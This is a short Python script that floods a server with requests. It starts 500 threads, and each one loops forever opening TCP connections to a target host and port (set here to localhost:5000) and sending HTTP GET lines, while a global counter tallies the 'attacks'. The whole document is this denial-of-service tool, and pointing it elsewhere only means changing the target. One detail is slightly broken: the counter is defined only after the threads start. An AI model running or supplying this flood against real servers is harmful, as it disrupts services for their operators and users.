import socket
import threading

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        
target = '127.0.0.1'
port = 5000
try:
  for _ in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
except (KeyboardInterrupt, SystemExit):
  print ('\n! Received keyboard interrupt, quitting threads.\n')

attack_num = 0